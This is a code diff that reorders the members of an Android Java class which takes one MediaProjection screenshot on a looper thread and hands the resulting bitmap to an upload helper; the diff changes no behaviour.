@@ -24,7 +24,14 @@ import java.nio.ByteBuffer;
 
 public class HandlerScreenshot {
     private static final String TAG = "HandlerScreenshot";
+    private static final String SCREENCAP_NAME = "Mario Avolio Capture";
+    private static final Builder builderInstance;
     private static HandlerScreenshot instance;
+
+    static {
+        builderInstance = new Builder();
+    }
+
     private WindowManager windowManager;
     private Integer resultCode;
     private Intent data;
@@ -33,20 +40,18 @@ public class HandlerScreenshot {
     private int mHeight;
     private MediaProjectionManager mpManager;
     private MediaProjection mMediaProjection;
-    private static final String SCREENCAP_NAME = "Mario Avolio Capture";
     private Handler mHandler;
     private ImageReader mImageReader;
-    private static final Builder builderInstance;
-
-    static {
-        builderInstance = new Builder();
-    }
 
     public HandlerScreenshot(WindowManager windowManager, MediaProjectionManager mpManager, Integer resultCode, Intent data) {
         this.windowManager = windowManager;
         this.mpManager = mpManager;
         this.resultCode = resultCode;
         this.data = data;
+        startLooper();
+    }
+
+    private HandlerScreenshot() {
         startLooper();
     }
 
@@ -65,8 +70,9 @@ public class HandlerScreenshot {
         return instance;
     }
 
-    private HandlerScreenshot() {
-        startLooper();
+    private static int getVirtualDisplayFlags() {
+        Log.d(TAG, "getVirtualDisplayFlags");
+        return DisplayManager.VIRTUAL_DISPLAY_FLAG_OWN_CONTENT_ONLY | DisplayManager.VIRTUAL_DISPLAY_FLAG_PUBLIC;
     }
 
     public void takeScreenshot() {
@@ -105,45 +111,40 @@ public class HandlerScreenshot {
         mImageReader.setOnImageAvailableListener(new ImageAvailableListener(), mHandler);
     }
 
-    private class ImageAvailableListener implements ImageReader.OnImageAvailableListener { // management by an handler
+    private void startLooper() {
+        new Thread() {
+            @Override
+            public void run() {
+                try {
+                    Looper.prepare();
 
-        @Override
-        public void onImageAvailable(ImageReader reader) {
 
-            Log.d(TAG, "onImageAvailable");
+                    Log.d(TAG, "I am between two looper.I am waiting to take screenshot...");
 
-//            it can make only one screenshot
-            mHandler.post(new Runnable() {
-                @Override
-                public void run() {
-                    mImageReader.setOnImageAvailableListener(null, mHandler);
-                    mMediaProjection.stop();
-                    mMediaProjection = null;
-                    mImageReader = null;
-                }
-            });
+                    /*
+                     *   A Handler allows you to send and process Message and Runnable objects associated with a thread's MessageQueue.
+                     *   Each Handler instance is associated with a single thread and that thread's message queue.
+                     *   When you create a new Handler it is bound to a Looper.
+                     *   It will deliver messages and runnables to that Looper's message queue and execute them on that Looper's thread.
+                     *
+                     * */
+                    mHandler = new Handler();
 
-            try (Image image = mImageReader.acquireLatestImage()) { // acquire last image
-                if (image != null) {
-                    Image.Plane[] planes = image.getPlanes();
-                    ByteBuffer buffer = planes[0].getBuffer();
-                    int pixelStride = planes[0].getPixelStride();
-                    int rowStride = planes[0].getRowStride();
-                    int rowPadding = rowStride - pixelStride * mWidth;
+                    /*
+                     * Loop is a Class used to run a message loop for a thread.
+                     * Threads by default do not have a message loop associated with them; to create one, call prepare()
+                     * in the thread that is to run the loop, and then loop() to have it process messages until the loop is stopped.
+                     * */
+                    Looper.loop();
 
-                    // create bitmap
-                    Bitmap bitmap = Bitmap.createBitmap(mWidth + rowPadding / pixelStride, mHeight, Bitmap.Config.ARGB_8888);
-                    bitmap.copyPixelsFromBuffer(buffer);
+                } catch (Exception e) {
 
-                    ImageSender.getInstance().uploadImage(bitmap);
-                    Log.e(TAG, "screenshot name: " + bitmap);
-
+                    Log.e(TAG, "ERROR IN LOOPER");
+                    e.printStackTrace();
                 }
 
-            } catch (Exception e) {
-                e.printStackTrace();
             }
-        }
+        }.start();
     }
 
     public static class Builder {
@@ -188,45 +189,44 @@ public class HandlerScreenshot {
         }
     }
 
-    private static int getVirtualDisplayFlags() {
-        Log.d(TAG, "getVirtualDisplayFlags");
-        return DisplayManager.VIRTUAL_DISPLAY_FLAG_OWN_CONTENT_ONLY | DisplayManager.VIRTUAL_DISPLAY_FLAG_PUBLIC;
-    }
+    private class ImageAvailableListener implements ImageReader.OnImageAvailableListener { // management by an handler
 
+        @Override
+        public void onImageAvailable(ImageReader reader) {
 
-    private void startLooper() {
-        new Thread() {
-            @Override
-            public void run() {
-                try {
-                    Looper.prepare();
+            Log.d(TAG, "onImageAvailable");
 
+//            it can make only one screenshot
+            mHandler.post(new Runnable() {
+                @Override
+                public void run() {
+                    mImageReader.setOnImageAvailableListener(null, mHandler);
+                    mMediaProjection.stop();
+                    mMediaProjection = null;
+                    mImageReader = null;
+                }
+            });
 
-                    Log.d(TAG, "I am between two looper.I am waiting to take screenshot...");
+            try (Image image = mImageReader.acquireLatestImage()) { // acquire last image
+                if (image != null) {
+                    Image.Plane[] planes = image.getPlanes();
+                    ByteBuffer buffer = planes[0].getBuffer();
+                    int pixelStride = planes[0].getPixelStride();
+                    int rowStride = planes[0].getRowStride();
+                    int rowPadding = rowStride - pixelStride * mWidth;
 
-                    /*
-                     *   A Handler allows you to send and process Message and Runnable objects associated with a thread's MessageQueue.
-                     *   Each Handler instance is associated with a single thread and that thread's message queue.
-                     *   When you create a new Handler it is bound to a Looper.
-                     *   It will deliver messages and runnables to that Looper's message queue and execute them on that Looper's thread.
-                     *
-                     * */
-                    mHandler = new Handler();
+                    // create bitmap
+                    Bitmap bitmap = Bitmap.createBitmap(mWidth + rowPadding / pixelStride, mHeight, Bitmap.Config.ARGB_8888);
+                    bitmap.copyPixelsFromBuffer(buffer);
 
-                    /*
-                     * Loop is a Class used to run a message loop for a thread.
-                     * Threads by default do not have a message loop associated with them; to create one, call prepare()
-                     * in the thread that is to run the loop, and then loop() to have it process messages until the loop is stopped.
-                     * */
-                    Looper.loop();
+                    ImageSender.getInstance().uploadImage(bitmap);
+                    Log.e(TAG, "screenshot name: " + bitmap);
 
-                } catch (Exception e) {
-
-                    Log.e(TAG, "ERROR IN LOOPER");
-                    e.printStackTrace();
                 }
 
+            } catch (Exception e) {
+                e.printStackTrace();
             }
-        }.start();
+        }
     }
 }
